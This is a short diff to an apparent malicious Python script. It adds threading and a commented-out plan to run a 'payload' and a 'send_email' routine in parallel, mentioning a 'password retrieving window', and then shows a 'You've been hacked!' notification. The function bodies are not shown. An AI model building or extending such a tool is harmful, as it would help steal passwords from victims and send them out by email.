@@ -42,6 +42,7 @@ import re
 import sqlite3
 import base64
 import enum
+import threading
 
 import smtplib
 import email
@@ -1012,6 +1013,12 @@ def send_email() -> None:
 
 if __name__ == "__main__":
     random.seed((datetime.now()).strftime("%H%M%S"))
+    # TODO: The threading approach does not work properly with the password
+    # retrieving window:
+    #payload_thread = threading.Thread(target = payload)
+    #send_email_thread = threading.Thread(target = send_email)
+    #payload_thread.start()
+    #send_email_thread.start()
     payload()
     send_email()
     notification("You've been hacked!", message="", app_name="filewriter")
